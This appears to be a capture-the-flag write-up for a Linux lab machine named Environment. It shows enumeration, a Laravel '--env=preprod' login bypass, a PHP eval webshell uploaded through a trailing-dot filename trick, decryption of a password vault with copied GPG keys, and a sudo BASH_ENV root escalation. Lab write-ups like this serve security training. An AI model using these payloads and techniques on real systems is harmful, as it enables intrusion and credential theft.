# Environment

```
Difficulty: Medium
Operating System: Linux
Hints: True
```

### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
| :-- | :--- | :--- | :--- |
| 1 | `N/A` | **Nmap** & **Dirsearch** | Performed initial enumeration to discover open ports and directories. Identified ports `22` (SSH) and `80` (HTTP). The web server hosted a Laravel application with a login page and file upload functionality. |
| 2 | `N/A` | **Laravel Environment Bypass** | Exploited a misconfiguration in the Laravel application by manipulating the environment variable via the query string (`?--env=preprod`). This allowed an automatic login as `user_id = 1`, bypassing the login page and granting access to the admin panel. |
| 3 | `www-data` | **File Upload Vulnerability** | Gained a reverse shell by uploading a webshell through the admin panel's file upload feature. Bypassed the server's file handling by adding a dot at the end of the filename (`123.php.`), which forced the file to be processed as a PHP script instead of being downloaded. |
| 4 | `hish` | **GPG Key Decryption** | Found a GPG-encrypted file named `keyvault.gpg` in `hish`'s home directory. The `www-data` user had read access to the user's GPG home directory, allowing me to copy the private key, decrypt the file, and retrieve the password for `hish`. |
| 5 | `root` | **Sudo Environment Variable Bypass** | Exploited a misconfigured `sudo` rule that allowed the `hish` user to run the `/usr/bin/systeminfo` command while preserving the `BASH_ENV` environment variable. By setting `BASH_ENV` to a malicious script, I gained a shell as the `root` user and retrieved the `root.txt` flag. |

-----

### Enumeration

I began with a standard **Nmap** scan to identify open ports and services on the target machine.

```bash
[root@kali] /home/kali/Environment
❯ nmap Environment.htb -sV -A
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey:
|   256 5c:02:33:95:ef:44:e2:80:cd:3a:96:02:23:f1:92:64 (ECDSA)
|_  256 1f:3d:c2:19:55:28:a1:77:59:51:48:10:c4:4b:74:ab (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-title: Save the Environment | environment.htb
|_http-server-header: nginx/1.22.1
```

The Nmap scan revealed two open ports:

  * **Port 22 (SSH):** Running OpenSSH 9.2p1.
  * **Port 80 (HTTP):** Running an Nginx web server, which serves a website with the title "Save the Environment".

Next, I used **Dirsearch** to enumerate directories and files on the web server.

```bash
[root@kali] /home/kali/Environment
❯ dirsearch -u http://environment.htb
  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12289
Target: http://environment.htb/
...
[07:24:26] 200 - 4KB - /index.php
[07:24:26] 200 - 2KB - /index.php/login/
...
[07:24:34] 200 - 2KB - /login
[07:24:34] 200 - 2KB - /login/
...
[07:25:02] 200 - 24B - /robots.txt
...
```

The scan identified several interesting pages, including `/login`, `/logout`, and a `robots.txt` file.

-----

### Initial Access: Environment Variable Bypass

Upon navigating to the `/login` page and attempting to log in, I observed that the application displayed a detailed error message, including part of the source code.

The code snippet reveals a key vulnerability. It shows an `if` statement checking the `remember` variable for the values `'False'` or `'True'`. However, it lacks an `else` block, meaning if `remember` is set to any other value, the `$keep_loggedin` variable remains undefined. This isn't the main vulnerability, but it points to a sloppy coding style.

The main vulnerability lies in how the application handles its environment. The source code analysis shows that if the current environment is set to **`"preprod"`**, the application automatically logs in the user with **`user_id = 1`** and redirects to the admin page.

This is a known vulnerability in some Laravel applications where the environment can be manipulated via query string parameters. A simple GET parameter `"--env=preprod"` can be used to set the environment.

I crafted a request to exploit this:

```http
POST /login?--env=preprod HTTP/1.1
Host: environment.htb
_token=JNCSO9rXXXXXXXXXXXXXXXXXXXXXXXXXXXx&email=a%40a.c&password=123&remember=True
```

By adding `?--env=preprod` to the URL, I bypassed the login and gained access to the admin panel.

-----

### Shell as `www-data`

Within the admin panel, I found a **profile** page with a file upload functionality. My goal was to upload a webshell to gain command execution.

First, I tried uploading a file named `shell.phtml` with the following content:

```http
-----------------------------60487661513624885101007722530
Content-Disposition: form-data; name="upload"; filename="shell.phtml"
Content-Type: image/jpg
GIF89a
<?php eval($_GET["cmd"]);?>
-----------------------------60487661513624885101007722530--
```

The upload was successful, but when I tried to access it via the web, the file was downloaded instead of being executed. This indicates the server doesn't process `.phtml` files as PHP.

A common bypass for this type of issue is to add a dot `.` at the end of the filename. This can trick the server into treating the file as a PHP script while still satisfying the file extension check.

I modified the filename to `123.php.` and tried again.

```http
-----------------------------168307501742120550952749914248
Content-Disposition: form-data; name="upload"; filename="123.php."
Content-Type: image/jpg
GIF89a
<?php eval($_GET["cmd"]);?>
-----------------------------168307501742120550952749914248--
```

This time, accessing the file at `http://environment.htb/upload/123.php.` successfully executed the webshell. I was able to use the shell to get a reverse shell as the `www-data` user.

From there, I located the `user.txt` file in the home directory of the user `hish`.

```bash
www-data@environment:/home/hish$ ls -al
...
-rw-r--r-- 1 root hish   33 May  7 21:46 user.txt
www-data@environment:/home/hish$ cat user.txt
985363b5exxxxxxxxxxx
```

-----

### Privilege Escalation to `hish`

While enumerating `hish`'s home directory, I found a `backup` directory containing a GPG-encrypted file named `keyvault.gpg`.

```bash
www-data@environment:/home/hish/backup$ ls -al
total 12
drwxr-xr-x 2 hish hish 4096 Jan 12 11:49 .
drwxr-xr-x 5 hish hish 4096 Apr 11 00:51 ..
-rw-r--r-- 1 hish hish  430 May  7 21:48 keyvault.gpg
```

The permissions on this file allow `hish` to read it. I checked the `.gnupg` directory in `hish`'s home directory and found that `www-data` had read access. This meant I could copy `hish`'s GPG keys and use them to decrypt the file.

```bash
# 1. Copy hish's GPG directory to a writable location
cp -r /home/hish/.gnupg /tmp/mygnupg

# 2. Set the correct permissions for gpg to work
chmod -R 700 /tmp/mygnupg

# 3. List the secret keys to confirm the copy worked
gpg --homedir /tmp/mygnupg --list-secret-keys

# 4. Decrypt the keyvault.gpg file
gpg --homedir /tmp/mygnupg --output /tmp/message.txt --decrypt /home/hish/backup/keyvault.gpg
```

After decrypting the file, I read the `message.txt` file and found a list of passwords.

```bash
www-data@environment:/tmp$ cat message.txt
PAYPAL.COM -> IhaXXXXXXXXXXXXXXXXXX
ENVIRONMENT.HTB -> marinXXXXXXXXXXXXX   // password !!!
FACEBOOK.COM -> summXXXXXXXXXXXXXX
```

The password for `ENVIRONMENT.HTB` was **`marXXXXXXXXXXXXXXX`**. I used this password to log in via SSH as the user `hish`.

-----

### Privilege Escalation to `root`

The final step was to escalate from `hish` to `root`. I started by checking `hish`'s `sudo` permissions.

```bash
hish@environment:~$ sudo -l
[sudo] password for hish:
Matching Defaults entries for hish on environment:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+="ENV BASH_ENV", use_pty
User hish may run the following commands on environment:
    (ALL) /usr/bin/systeminfo
```

The output shows that `hish` can run `/usr/bin/systeminfo` as `root` without a password. Crucially, the `env_keep+="ENV BASH_ENV"` line tells us that the `ENV` and `BASH_ENV` environment variables are preserved when running `sudo`.

This is a classic privilege escalation vector. By setting `BASH_ENV` to a shell script, we can force Bash to execute commands from that script before running `/usr/bin/systeminfo`.

I created a script named `exp.sh` in my home directory with the following content:

```bash
echo 'bash -p' > exp.sh
chmod +x exp.sh
```

The `bash -p` command runs Bash in "privileged" mode, which prevents it from dropping the effective UID to the real UID, allowing it to maintain `root` privileges.

Finally, I executed the `sudo` command with the `BASH_ENV` variable set to my script.

```bash
hish@environment:~$ sudo BASH_ENV=./exp.sh /usr/bin/systeminfo
root@environment:/home/hish# id
uid=0(root) gid=0(root) groups=0(root)
```

I was now `root` and could read the final flag.

```bash
root@environment:/home/hish# cat /root/root.txt
943dd249259dxxxxxxxxxxxx
```